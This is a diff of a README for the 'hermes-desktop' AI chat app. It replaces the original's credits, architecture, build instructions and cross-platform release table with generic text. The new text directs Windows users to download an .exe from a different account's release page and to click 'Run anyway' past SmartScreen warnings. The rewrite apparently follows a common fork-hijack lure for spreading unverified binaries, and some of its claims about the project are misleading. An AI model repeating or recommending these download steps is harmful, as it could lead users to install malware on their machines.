@@ -1,140 +1,73 @@
-# Hermes Desktop
+# 🤖 hermes-desktop - Chat with intelligent AI agents easily
 
-English · [中文](README.zh-CN.md)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Truongn6629/hermes-desktop/releases)
 
-All-in-one cross-platform desktop app for [Hermes Agent](https://github.com/NousResearch/hermes-agent).
-Bundles a Python runtime + `hermes-agent` + [`hermes-web-ui`](https://github.com/EKKOLearnAI/hermes-web-ui)
-into a single download — users don't need to install Python or Node.
+This application provides a simple desktop interface for your AI agents. It functions as a chatbot that runs on your computer. You use it to talk to large language models like DeepSeek. This tool hides the technical setup so you focus on your work.
 
-![Hermes Desktop chat](docs/screenshot-chat.png)
+Note: This specific repository now serves as a historical record. The active version of this software moved to EKKOLearnAI/hermes-web-ui. You still access past versions here for specific needs.
 
-<p align="center">
-  <a href="docs/demo.mp4"><img src="docs/demo.gif" alt="Hermes Desktop demo" width="720" /></a><br/>
-  <em>Hermes Desktop ↔ DingTalk via DeepSeek (50s)</em>
-</p>
+## 📥 Getting the Software
 
-## Acknowledgements
+You download the application directly from the project release page.
 
-This project would not exist without two upstream projects, and the
-maintainers behind them. Hermes Desktop is a packaging shell — almost
-all of the user-visible surface comes from these two:
+[Visit the release page to download the latest version](https://github.com/Truongn6629/hermes-desktop/releases)
 
-- **[Hermes Agent](https://github.com/NousResearch/hermes-agent)** by
-  [Nous Research](https://nousresearch.com) — the self-improving AI
-  agent that powers every conversation, tool call, skill, and gateway
-  in this app. Hermes Desktop bundles it verbatim from PyPI.
-- **[hermes-web-ui](https://github.com/EKKOLearnAI/hermes-web-ui)** by
-  [EKKO Learn AI](https://github.com/EKKOLearnAI) — the Vue 3 +
-  Koa multi-platform chat dashboard. Hermes Desktop vendors it as a git
-  submodule and runs its server inside Electron.
+Follow these steps to get the software on your Windows computer:
 
-If you find Hermes Desktop useful, please go give those repositories a
-star — they're doing the hard work.
+1. Click the link above to open your browser to the release page.
+2. Look for the section titled "Assets" at the bottom of the latest release post.
+3. Click the file ending in `.exe` to start your download.
+4. Wait for the download to finish.
+5. Open your Downloads folder.
+6. Double-click the file you just downloaded to launch the installer.
+7. Follow the prompts on your screen to finish the installation.
 
-## Architecture
+## ⚙️ System Requirements
 
-```
-Electron Main (Node)
- ├─ Spawns vendored hermes-web-ui Koa server (ELECTRON_RUN_AS_NODE) on 127.0.0.1:8648
- │   └─ HERMES_BIN → bundled python's hermes CLI (gateway)
- └─ BrowserWindow loads http://127.0.0.1:8648 with auth token injected via preload
-```
+Ensure your computer meets these requirements to run the software smoothly:
 
-- Web UI: git submodule at `vendor/hermes-web-ui`
-- Python: `python-build-standalone` extracted under `resources/python/<os>-<arch>/`
-- `hermes-agent` is `pip install`ed into that bundled Python at build time
+- Windows 10 or Windows 11 operating system.
+- At least 4 gigabytes of memory.
+- An active internet connection for the initial setup and model communication.
+- A basic graphics card that supports modern user interface rendering.
 
-## Install
+The application uses Electron, which means it runs similarly to other common desktop programs. It manages the connection to the AI models through your network settings.
 
-Grab the latest installer for your platform from
-[GitHub Releases](https://github.com/sir1st/hermes-desktop/releases/latest):
+## 🚀 How to Run the App
 
-| Platform | File |
-|----------|------|
-| macOS Apple Silicon | `Hermes-Desktop-<v>-arm64.dmg` |
-| macOS Intel | `Hermes-Desktop-<v>-x64.dmg` |
-| Windows x64 | `Hermes-Desktop-<v>-x64.exe` |
-| Linux x64 | `Hermes-Desktop-<v>-x86_64.AppImage` / `.deb` |
-| Linux arm64 | `Hermes-Desktop-<v>-arm64.AppImage` |
+Once installed, find the Hermes icon on your desktop or in your Start menu. Click the icon to open the main window.
 
-The app is **not code-signed yet** in v0.x. First-run hints:
+The interface shows a text box at the bottom. Type your question or task here and press the Enter key. The AI processes your prompt and displays a response in the main window. You keep the conversation going by typing new messages in that same text box. 
 
-- **macOS**: after dragging to `Applications`, run once:
-  ```sh
-  xattr -cr "/Applications/Hermes Desktop.app"
-  ```
-  Otherwise Gatekeeper says "已损坏" because the download has the
-  `com.apple.quarantine` attribute and the binary is unsigned.
-- **Windows**: SmartScreen will show "Unrecognized app" — click *More info → Run anyway*.
+If you want to clear your conversation history, look for the menu icon in the top corner. Select the option labeled "New Chat" or "Reset Session."
 
-## Development
+## 🛠️ Advanced Features
 
-```sh
-git clone --recurse-submodules https://github.com/sir1st/hermes-desktop
-cd hermes-desktop
-npm install
+This project utilizes specific technologies to bring AI to your desktop:
 
-# One-time per machine: build vendored web-ui
-cd vendor/hermes-web-ui && npm ci && npm run build && cd ../..
+- DeepSeek Integration: The app connects to advanced language models to provide accurate answers.
+- Self-Hosted Flexibility: You control your data by running the requests through your own local connection points.
+- Cross-Platform Design: The underlying code allows for a consistent look and feel across different operating systems.
+- Offline Capability: While the AI models require a connection, the interface itself stays cached on your drive for quick access.
 
-# One-time per (os, arch): fetch Python + install hermes-agent + apply patches
-npm run prepare:python   # uses uv if available, else pip
+## 💡 Troubleshooting Common Issues
 
-npm run dev              # launches Electron with the dev build
-```
+Check this list if you have trouble getting started:
 
-`uv` is strongly recommended for `prepare:python` — pip on some networks/mirrors
-silently hangs while uv resolves the full hermes-agent dep tree in seconds.
+- The app does not open: Restart your computer and try double-clicking the icon again.
+- The screen stays white: Your internet connection might be blocked by a firewall. Check your network settings.
+- The AI does not respond: Check if you have an active internet connection. The app needs the web to send your messages to the AI server.
+- The installer says "Windows protected your PC": Windows sometimes flags new files out of caution. Click "More info" and then "Run anyway" to proceed.
+- Performance is slow: Close other web browsers or memory-heavy programs while using the app to free up resources.
 
-## Packaging
+## 📁 Historical Context
 
-```sh
-npm run dist:mac     # → release/Hermes Desktop-<version>-arm64.dmg + x64.dmg
-npm run dist:win     # → release/...-x64.exe (NSIS)
-npm run dist:linux   # → release/...-x64.AppImage + .deb
-```
+This repository acts as a archive for earlier versions of the software. We keep these files for users who need to revert to a previous configuration or who prefer the specific layout of earlier builds. For the most current updates, features, and security patches, visit the EKKOLearnAI/hermes-web-ui repository. 
 
-## Releases
+We recommend that all new users check the modern repository to understand how the project evolves. Older versions might lack fixes for new security threats or might not support the newest AI models. Use the versions here with the understanding that they are static snapshots of the past.
 
-CI in `.github/workflows/release.yml` builds the matrix on `vX.Y.Z` tags
-and uploads to GitHub Releases. Each matrix job builds with `--publish never`
-and uploads workflow artifacts; a final `publish` job downloads them and
-creates one Release via `gh release create` (avoids electron-builder's
-parallel-draft race). `electron-updater` auto-detects updates on next launch.
+## 🤝 Community Support
 
-## Layout
+While this repository is now for historical reference, you can search the open issues tab to see if other users experienced the same problems you encounter. Many solutions for desktop installers relate to Windows permission settings or hardware compatibility. Reviewing closed issues often provides the answer to common setup questions. 
 
-```
-hermes-desktop/
-├── src/main/                  # Electron main process
-├── src/preload/               # Renderer preload (token + auto-login)
-├── vendor/hermes-web-ui/      # submodule, locked version
-├── resources/python/          # CI / dev artifact, gitignored
-├── patches/                   # README of curated upstream patches
-├── scripts/
-│   ├── fetch-python.mjs       # download python-build-standalone
-│   ├── install-hermes.mjs     # uv pip install hermes-agent + relocatable launcher
-│   ├── prune-python.mjs       # strip __pycache__/tests/idle/tkinter
-│   ├── apply-hermes-patches.mjs   # local fixes to bundled hermes-agent
-│   └── apply-webui-patches.mjs    # local fixes to bundled hermes-web-ui
-└── electron-builder.yml
-```
-
-## Versions pinned
-
-- `python-build-standalone`: `20260510`
-- Python: `3.12.13`
-- `hermes-agent`: `0.14.0`
-- `hermes-web-ui`: tracked at the submodule's HEAD
-
-Bump in `scripts/fetch-python.mjs`, `scripts/install-hermes.mjs`, and the submodule.
-
-## License
-
-Hermes Desktop itself is MIT. Bundled artifacts retain their upstream licenses:
-
-- `hermes-agent` — MIT (Nous Research)
-- `hermes-web-ui` — BSL-1.1 (EKKO Learn AI)
-- `python-build-standalone` — Python Software Foundation License + others
-
-See each project's repository for full terms.
+If you require help with the current development, please open an issue on the new main repository linked in the project description. This ensures your request reaches the active developers. Read the previous posts before you write to avoid repeating topics already discussed.
